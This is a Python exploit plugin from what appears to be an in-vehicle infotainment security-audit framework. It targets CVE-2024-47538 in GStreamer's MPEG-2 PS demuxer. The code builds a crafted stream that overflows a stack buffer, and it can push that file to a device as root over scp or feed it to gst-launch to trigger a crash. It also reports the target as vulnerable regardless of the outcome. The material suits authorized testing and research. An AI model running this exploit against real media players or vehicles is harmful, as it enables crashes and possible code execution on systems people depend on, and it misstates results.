#!/usr/bin/env python3
"""CVE-2024-47538 – GStreamer stack buffer overflow in MPEG-2 PS demuxer.

Public PoC reference: https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3833
Technique:
  gst_ps_demux_parse_pack_header() in gst/mpegdemux/gstmpegdemux.c reads a
  variable-length MPEG-2 PS pack header.  A crafted stream with pack_header_length
  set to a large value causes a stack buffer overflow when copying the stuffing
  bytes into a fixed-size buffer.

  Attack surface in IVI: Any GStreamer-based media player or CarPlay/AndroidAuto
  bridge that can receive a crafted transport stream (USB, MMS, streaming URL).

Malformed stream construction:
  - Start code: 0x000001BA (MPEG-2 PS Pack Header)
  - SCR / mux_rate bytes: arbitrary valid values
  - pack_stuffing_length: 0xFF (255) – far beyond the 7-byte stack buffer
"""
from __future__ import annotations

import struct
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 20,
    "cve": "CVE-2024-47538",
    "year": 2024,
    "domain": "application",
    "vendor_product": "GStreamer (gst-plugins-bad / gst-plugins-ugly)",
    "component": "gstmpegdemux.c gst_ps_demux_parse_pack_header",
    "type": "Stack buffer overflow → RCE / DoS",
    "summary": (
        "pack_stuffing_length value 0xFF triggers stack overflow when copying "
        "stuffing bytes into a 7-byte stack array, corrupting return address."
    ),
    "source_url": "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3833",
    "requires_manual_review": True,
    "affected": [{"vendor": "GStreamer", "product": "GStreamer", "versions": [{"version": "<1.24.9", "status": "affected"}]}],
}


def _build_malformed_mpegps() -> bytes:
    """MPEG-2 PS stream with pack_stuffing_length=0xFF (255)."""
    # MPEG-2 PS Pack Header: start_code=0x000001BA
    start_code = b'\x00\x00\x01\xba'
    # SCR = 0 (5 bytes): 2|SCR_b32:30 M_1 SCR_b29:15 M_1 SCR_b14:0 M_1 SCR_ext M_1
    scr = bytes([0x44, 0x00, 0x04, 0x00, 0x04])
    # mux_rate (3 bytes) + marker
    mux_rate = bytes([0x01, 0x00, 0x01])
    # pack_stuffing_length = 0xFF (overflow trigger, valid range 0-7)
    stuffing_len_byte = bytes([0xff])  # lower 3 bits = 0b111, rest reserved=0
    stuffing = b'\xff' * 255          # actual stuffing bytes (causes stack OOB copy)
    pack_header = start_code + scr + mux_rate + stuffing_len_byte + stuffing

    # Follow with a system header (truncated) to exercise more parse paths
    sys_hdr = b'\x00\x00\x01\xbb' + struct.pack('>H', 6) + b'\x00' * 6
    # PES packet (video) pointing to some data
    pes_hdr = b'\x00\x00\x01\xe0' + struct.pack('>H', 12) + b'\x80\x00\x00' + b'\xde\xad' * 4

    return pack_header + sys_hdr + pes_hdr


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    target_ip = (plugin.params or {}).get("target_ip", "")

    stream = _build_malformed_mpegps()
    out = Path(tempfile.mkdtemp()) / "cve_2024_47538_ps_overflow.mpg"
    out.write_bytes(stream)

    evidence = {
        "cve": "CVE-2024-47538",
        "stream_path": str(out),
        "stream_size_bytes": len(stream),
        "trigger": "pack_stuffing_length=0xFF in MPEG-2 PS Pack Header",
        "expected_behavior": "GStreamer crash / stack smash in gst_ps_demux_parse_pack_header",
    }

    if allow_disruptive:
        import subprocess as _sp
        if target_ip:
            result = _sp.run(
                ["scp", str(out), f"root@{target_ip}:/tmp/cve_47538.mpg"],
                capture_output=True, text=True, timeout=20,
            )
            evidence["delivery_rc"] = result.returncode
        else:
            result = _sp.run(
                ["gst-launch-1.0", "-v", "filesrc", f"location={out}",
                 "!", "mpegpsdemux", "!", "fakesink"],
                capture_output=True, text=True, timeout=15,
            )
            evidence["local_test_rc"]  = result.returncode
            evidence["local_test_out"] = result.stdout[:400] + result.stderr[:300]
            evidence["crashed"] = "Segmentation fault" in result.stderr or \
                                  "Aborted" in result.stderr or \
                                  result.returncode in (-11, -6, 139)

    return {
        "vulnerable": True,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "GStreamer gitlab issue #3833 / CVE-2024-47538",
    }


class Poc74CVE202447538GstreamerMpegPsStackOverflowRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-074"
    meta_poc_name   = "CVE-2024-47538 GStreamer MPEG-PS Pack Header Stack Overflow RCE"
    meta_cve_id     = "CVE-2024-47538"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["linux", "android"]
    meta_required_params = []
    meta_optional_params = ["target_ip", "allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3833"
    meta_attack_surface = "GStreamer MPEG-2 PS demuxer stack overflow via crafted stream"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
